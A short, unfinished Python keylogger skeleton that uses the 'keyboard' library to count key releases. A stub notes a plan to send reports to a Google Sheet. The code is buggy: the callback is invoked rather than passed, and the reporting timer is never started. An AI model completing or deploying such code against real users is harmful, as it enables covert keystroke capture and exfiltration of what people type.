import keyboard
from threading import Timer
from datetime import datetime


class Keylogger:
    def __init__(self, interval, report_method="local"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.count_key_pressed = 0
        self.start_dat = datetime.now()
        self.end_dat = datetime.now()

    def callback(self):
        """
        invoked whenever a keyboard event is occurred
        """
        self.count_key_pressed = self.count_key_pressed + 1
        print(f"total key pressed = {self.count_key_pressed}")

    def report(self):
        """
        todo : send report to google sheet
        """
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dat = datetime.now()
        keyboard.on_release(callback=self.callback())
        print(f"{datetime.now()} - Activated Keylogger")
        keyboard.wait()


if __name__ == "__main__":
    keylogger = Keylogger(interval=0, report_method="local")
    keylogger.start()

